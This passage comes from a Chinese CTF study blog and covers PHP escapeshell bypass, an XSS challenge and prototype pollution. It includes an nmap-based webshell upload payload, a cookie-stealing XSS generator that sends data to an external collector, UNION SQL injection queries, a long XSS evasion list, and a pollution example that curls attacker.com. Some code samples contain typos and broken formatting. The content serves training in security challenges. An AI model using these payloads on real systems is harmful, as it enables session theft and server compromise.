+<p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；<br>如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
+<p>同样的escapeshellcmd()函数也是发挥防止RCE风险的作用。其功能为：shell 元字符转义。</p>
+<p>原理是：    </p>
+<pre><code>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
+
+反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+</code></pre>
+<p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；<br>第二，如果单引号和双引号不是成对出现时，会被转义掉。</p>
+<p>然而，虽然一开始是为了降低风险，但如果出现</p>
+<pre><code>escapeshellarg()
+escapeshellcmd()
+</code></pre>
+<p>的形式，反而会导致进一步的RCE漏洞。<br>因此我们可以从这里入手，从而利用system()函数得到flag</p>
+<p>我们使用上传一句话木马的方式来RCE</p>
+<p>payload：</p>
+<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;
+</code></pre>
+<p>这个payload的意思是上传一句话木马的同时，将 nmap 的扫描结果保存为 hack.php 文件以免蚁剑连接时返回内容为空。<br>最后蚁剑连接，在根目录下找到flag  </p>
+<h3 id="在这道题目中其他需要注意的是关于转义符的理解："><a href="#在这道题目中其他需要注意的是关于转义符的理解：" class="headerlink" title="在这道题目中其他需要注意的是关于转义符的理解："></a>在这道题目中其他需要注意的是关于转义符的理解：</h3><p>上面提到escapeshellarg()函数会将 单引号进行利用或转义，然后再在两边加上引号引起来。<br>其转义的方式就是在前面加上一个\。同样的，escapeshellcmd()也会在对特殊符号进行转义，即在其前面加上\<br>其目的是让程序认为单引号仅仅作为符号存在，而不作为指令的一部分。</p>
+<p>例如：<br>如果传入</p>
+<pre><code>It&#39;s a dog.
+</code></pre>
+<p>就可能导致多余的’使得程序报错。<br>而使用转义符之后：</p>
+<pre><code>It\&#39;s a dog.
+#等于 &quot;It&#39;s a dog.&quot; 
+</code></pre>
+<p>这时会作为一个完整的字符串进行后续操作。  </p>
+<h1 id="记一道没有做出来的XSS攻击题目"><a href="#记一道没有做出来的XSS攻击题目" class="headerlink" title="记一道没有做出来的XSS攻击题目"></a>记一道没有做出来的XSS攻击题目</h1><p>上一周在做题时了解到利用Cooike可以进行XSS攻击，这周就遇到一道XSS，具体是利用XSS通过更改Cooike获取管理员权限来得到flag  </p>
+<blockquote>
+<p> 题目在这里 <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2">CISCN2019 华东北赛区 Web2 1</a>  </p>
+</blockquote>
+<p>一开始打开发现是一个非常正常的文章汇总页面，一时间以为走错地方了（）</p>
+<p>然后探索发现存在注册以及登录的功能。注册个admin，注册成功，说明这里似乎对用户名没有限制。  </p>
+<p>发现存在上传文章和反馈两个功能，翻看WP得知，这里的上传文章功能存在XSS漏洞，可以在这里上传XSS攻击代码，然后通过上传反馈得到管理员的SESSID，进行SQL注入后得到flag  </p>
+<p>我们得知这里存在一个admin.php,访问提示不是管理员无法查看（果然）  </p>
+<p>于是我们尝试进行XSS攻击。发现这里还存在WAF，会将’’(‘’转义成”（”  </p>
+<p>使用这个脚本  </p>
+<pre><code>in_str = &quot;(function()&#123;window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation=&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie=&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener=&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();&quot;
+
+output = &quot;&quot;
+
+for c in in_str:
+    output += &quot;&amp;#&quot; + str(ord(c))
+
+print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)
+</code></pre>
+<p>生成payload后提交，得到url后进反馈  </p>
+<p>输入得到的url（题目提示要把靶机域名改为web）接下来解决验证码问题，题目中给出<em>substr(md5($str), 0, 6) &#x3D;&#x3D;&#x3D; “cfde39”：</em><br>这是一个MD5弱比较，使用下面这个脚本来生成验证码  </p>
+<pre><code>import hashlib
+import random
+import string
+
+target = "cfde39"
+
+while True:
+    # 生成一个随机字符串 (4 个字符)
+    s = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    hash_value = hashlib.md5(s.encode()).hexdigest()[:6]
+    if hash_value == target:
+        print(f"Found: &#123;s&#125;")
+        break
+
+</code></pre>
+<p>由于题目中提供的xss.buuoj.cn已经停止服务了，所以我们还要自己搭建一个用于接收反馈的平台  </p>
+<blockquote>
+<p>项目地址：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">XSS数据接收平台（无SQL版）</a>  </p>
+</blockquote>
+<p>使用小皮面板来搭建这个平台，可惜的是搭建好后我的模板都神奇地消失了，一开始以为是Windows Defender的问题（虽然确实），但关掉之后还是没有js模板，导致平台一直没法用，只能止步于此了。  </p>
+<p>如果顺利的话，可以截取到管理员的SESSID，从而成功登录到admin.php，然后用</p>
+<pre><code>-2 union select 1,2,3#
+
+-2 union select 1,database(),user()#
+
+-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ciscn'#
+
+-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'#
+
+-2 union select 1,2,group_concat(flagg) from ciscn.flag#
+</code></pre>
+<p>SQL联合查询得到flag  </p>
+<p>这里记录一些常见的XSS攻击代码  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1)普通的XSS JavaScript注入</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(2)IMG标签XSS使用JavaScript命令</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br><span class="line"></span><br><span class="line">(3)IMG标签无分号无引号</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(4)IMG标签大小写不敏感</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(5)HTML编码(必须有分号)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(6)修正缺陷IMG标签</span><br><span class="line"></span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">(7)formCharCode标签(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line"></span><br><span class="line">(8)UTF-8的Unicode编码(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"></span><br><span class="line">(11)嵌入式标签,将Javascript分开</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(12)嵌入式编码标签,将Javascript分开</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(13)嵌入式换行符</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(14)嵌入式回车</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;tp://ww&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;w.shell&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;.net/1.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;js&gt;&lt;/sc&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">(17)空字符12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line"></span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6perl -e &#x27;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line"></span><br><span class="line">perl -e &#x27;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">(19)Spaces和meta前的IMG标签</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line"></span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(23)双开括号</span><br><span class="line"></span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line"></span><br><span class="line">(25)无结束脚本标记2</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line"></span><br><span class="line">(26)半开的HTML/JavaScript XSS</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">(27)双开角括号</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line"></span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(29)换码过滤的JavaScript</span><br><span class="line"></span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line"></span><br><span class="line">(30)结束Title标签</span><br><span class="line"></span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://segmentfault.com/a/1190000022348467">更多XSS攻击代码</a>  </p>
+</blockquote>
+<p>顺便贴上几篇参考的WP  </p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/AndyNoel/p/14764006.html">WP1</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.cnblogs.com/rabbittt/p/13372401.html">WP2</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.csdn.net/mochu7777777/article/details/105212961">WP3</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.51cto.com/u_16159500/6515093">WP4</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://ctf.eki.im/buuoj/ciscn-northeast-2019.html">WP5</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_44652484/article/details/134169568">XSS数据接收平台配置教程</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>原型链污染</title>
+    <url>/posts/bba757cf/</url>
+    <content><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="什么是原型链污染？"><a href="#什么是原型链污染？" class="headerlink" title="什么是原型链污染？"></a>什么是原型链污染？</h2><p>原型链污染是一种针对JavaScript运行时的注入攻击。</p>
+<p>在 JavaScript 中，通过修改对象的原型（prototype），让所有继承该原型的对象都“被动继承”这些修改，可能导致意外行为或安全漏洞。</p>
+<p>通过原型链污染，攻击者可以控制对象属性的默认值，从而篡改应用程序的逻辑并可能导致服务被拒绝，甚至在某些极端情况下远程执行代码。</p>
+<p>通俗地讲，想想你是一家车厂的老板，所有汽车都按照一个 <strong>标准模板</strong> 生成，这个模板就是 __原型__。有一天，有人在模板上偷偷画了个鬼脸，结果之后生产的每辆车都带着这个鬼脸——这就是原型链污染。</p>
+<h2 id="为什么会发生原型链污染？"><a href="#为什么会发生原型链污染？" class="headerlink" title="为什么会发生原型链污染？"></a>为什么会发生原型链污染？</h2><ol>
+<li>原型链机制</li>
+</ol>
+<p>JavaScript 中对象可以继承属性和方法。为了使得在编写程序时更加简便，避免由于方法绑定到对象上在使用时多次调用，利用原型（prototype）就可以使得所有用同一类来实例化的对象可以直接拥有这个类中的所有内容，包括属性和方法。</p>
+<p>JavaScript 中的继承机制：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">funtion <span class="title class_">Father</span>() &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">funtion <span class="title class_">Son</span>() &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Son</span> = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)  </span><br><span class="line"><span class="comment">// 最后输出Name : Melania Trump</span></span><br></pre></td></tr></table></figure>
+
+<p>总结一下，对于对象 son ，在调用 son.last_name 的时候，实际上 JavaScript 引擎会进行如下操作：</p>
+<p>1.在对象 son 中寻找 last_name<br>2.如果找不到，则在<code>son.__proto__</code>中寻找 last_name<br>3.如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找 last_name<br>4.依次寻找，直到找到 null 结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是 null</p>
+<p>JavaScript 的这个查找的机制，被运用在面向对象的继承中，被称作 prototype 继承链。</p>
+<p>但是这一操作也使得一旦可以修改对象的原型，将使得所有的对象都被修改，从而导致安全隐患。  </p>
+<p>例如：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cat1 = &#123;&#125;; <span class="comment">// 普通对象</span></span><br><span class="line">car1.<span class="title function_">toString</span>(); <span class="comment">// 调用的时Object.prototype.toString</span></span><br></pre></td></tr></table></figure>
+
+<p>如果修改了<code>Object.orototype.toString</code>,所有对象的<code>toString</code>方法都会变。</p>
+<p>举一个实际利用中的例子  </p>
+<p>假设一个网站允许用户提交JSON数据：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&quot;isAdmin: true&quot;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">// 用户提交的数据中偷偷加了__proto__.isAdmin = true</span></span><br></pre></td></tr></table></figure>
+
+<p>此时，<code>Object.prototype.isAdmin</code>被设置为 true ，所有对象都会继承这个属性：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> normalUser = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(normalUser.<span class="property">isAdmin</span>); <span class="comment">// 输出true，(本不该有管理权限)</span></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 具体在CTF中的应用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 如何判断题目设计原型链污染？  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1.代码审计  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 对象合并操作：题目代码中出现`</span><span class="title class_">Object</span>.<span class="title function_">assign</span>()<span class="string">`、`</span>lodash.<span class="title function_">marge</span>()<span class="string">`、`</span><span class="title class_">JSON</span>.<span class="title function_">parse</span>()<span class="string">`等函数  </span></span><br><span class="line"><span class="string">- 动态属性赋值：如`</span>obj[key] = value<span class="string">`,其中`</span>key<span class="string">`或`</span>value<span class="string">`来自用户输入  </span></span><br><span class="line"><span class="string">- 原型链关键词：代码中显式使用`</span>__proto__<span class="string">`、`</span>prototype<span class="string">`、`</span>constructor<span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.黑箱测试特征</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 权限异常：普通用户突然拥有管理员权限，(如访问/admin 路由)  </span></span><br><span class="line"><span class="string">- 全局属性篡改: 所有对象自动继承某个属性(如 token 、isAdmin )</span></span><br><span class="line"><span class="string">- 行为突变： 调用默认方法(如`</span><span class="title function_">toString</span>()<span class="string">`)时返回意外结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3.验证方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交测试Payload：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="title class_">JSON</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;test&quot;</span>: <span class="number">123</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查响应：</p>
+<ul>
+<li><p>创建新对象 const obj &#x3D; {};，观察 obj.test 是否为 123。</p>
+</li>
+<li><p>若成功，说明原型链被污染。</p>
+</li>
+</ul>
+<h3 id="突破口与利用场景"><a href="#突破口与利用场景" class="headerlink" title="突破口与利用场景"></a>突破口与利用场景</h3><p>1.常见输入点：</p>
+<ul>
+<li>JSON数据提交：通过POST请求体传递恶意Payload。</li>
+<li>URL参数或查询字符串：如 ?key&#x3D;<strong>proto</strong>.isAdmin&amp;value&#x3D;true。</li>
+<li>表单字段：用户可控的表单字段名或值。</li>
+</ul>
+<p>2.敏感属性覆盖：</p>
+<ul>
+<li>权限标志：isAdmin、isVIP、role。</li>
+<li>身份凭证：token、session。</li>
+<li>函数重写：覆盖 toString()、valueOf() 等原型方法，触发逻辑漏洞。</li>
+</ul>
+<p>3.依赖库漏洞：</p>
+<ul>
+<li>Lodash（CVE-2019-10744）：旧版本的 _.defaultsDeep 未过滤 __proto__。</li>
+<li>Express.js中间件：解析请求体时未过滤特殊属性。</li>
+</ul>
+<h3 id="具体操作步骤"><a href="#具体操作步骤" class="headerlink" title="具体操作步骤"></a>具体操作步骤</h3><p>步骤一：构建Payload</p>
+<p>基础Payload：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过过滤的变种：</p>
+<ul>
+<li>Unicode编码：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;\u005F_proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>嵌套污染：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤2：触发漏洞</p>
+<ul>
+<li>场景1：对象合并（如 Object.assign）：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务端代码示例</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>);</span><br><span class="line"><span class="keyword">const</span> config = &#123; <span class="attr">theme</span>: <span class="string">&quot;light&quot;</span> &#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(config, userInput); <span class="comment">// 污染点</span></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload提交：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="title class_">JSON</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;isAdmin&quot;</span>: <span class="literal">true</span>&#125;&#125;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 场景2：动态属性赋值：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="title class_">JavaScript</span></span><br><span class="line"><span class="comment">// 服务端代码示例</span></span><br><span class="line"><span class="keyword">const</span> key = req.<span class="property">query</span>.<span class="property">key</span>; <span class="comment">// 用户可控</span></span><br><span class="line"><span class="keyword">const</span> value = req.<span class="property">query</span>.<span class="property">value</span>;</span><br><span class="line">obj[key] = value;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload提交：</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<p>GET &#x2F;api&#x2F;set?key&#x3D;<strong>proto</strong>.isAdmin&amp;value&#x3D;true</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">步骤3：验证污染效果</span><br><span class="line"></span><br><span class="line">- 直接检查原型属性：</span><br><span class="line"></span><br><span class="line">```JavaScript</span><br><span class="line">console.log(Object.prototype.isAdmin); // 输出应为 true</span><br></pre></td></tr></table></figure>
+
+<p>触发敏感逻辑：</p>
+<ul>
+<li><p>访问需要管理员权限的接口（如 &#x2F;admin）。</p>
+</li>
+<li><p>调用被覆盖的方法：</p>
+</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">toString</span>()); <span class="comment">// 若覆盖为恶意函数，可能触发XSS或RCE</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤4：高级利用（结合其他漏洞）</p>
+<ul>
+<li>远程代码执行（RCE）：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;exec&quot;</span><span class="punctuation">:</span> <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;curl http://attacker.com&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>信息泄露：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;getSecret&quot;</span><span class="punctuation">:</span> function() <span class="punctuation">&#123;</span> return this.internalSecret; <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">四、绕过防御的技巧</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>属性名混淆：</span><br><span class="line"></span><br><span class="line">- 大小写变异：`__PROTO__`、`__proto__`。</span><br><span class="line"></span><br><span class="line">- 特殊字符插入：`__pro__to__`（部分过滤逻辑不严格）。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>多层嵌套污染：</span><br><span class="line"></span><br><span class="line">```JSON</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">某些合并函数可能递归处理嵌套对象。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>利用库函数特性：</span><br><span class="line"></span><br><span class="line">- Lodash旧版本：_.merge 默认处理 __proto__。</span><br><span class="line"></span><br><span class="line">- jQuery.extend：需测试是否深拷贝原型属性。  </span><br><span class="line"></span><br><span class="line">例题：</span><br><span class="line"></span><br><span class="line">```JSON</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    app.engine(&#x27;ejs&#x27;<span class="punctuation">,</span> function (filePath<span class="punctuation">,</span> options<span class="punctuation">,</span> callback) <span class="punctuation">&#123;</span> </span><br><span class="line">    <span class="comment">// define the template engine</span></span><br><span class="line">        fs.readFile(filePath<span class="punctuation">,</span> (err<span class="punctuation">,</span> content) =&gt; <span class="punctuation">&#123;</span></span><br><span class="line">            if (err) return callback(new Error(err))</span><br><span class="line">            let compiled = lodash.template(content)</span><br><span class="line">            let rendered = compiled(<span class="punctuation">&#123;</span>...options<span class="punctuation">&#125;</span>)</span><br><span class="line"></span><br><span class="line">            return callback(<span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> rendered)</span><br><span class="line">        <span class="punctuation">&#125;</span>)</span><br><span class="line">    <span class="punctuation">&#125;</span>)</span><br><span class="line">    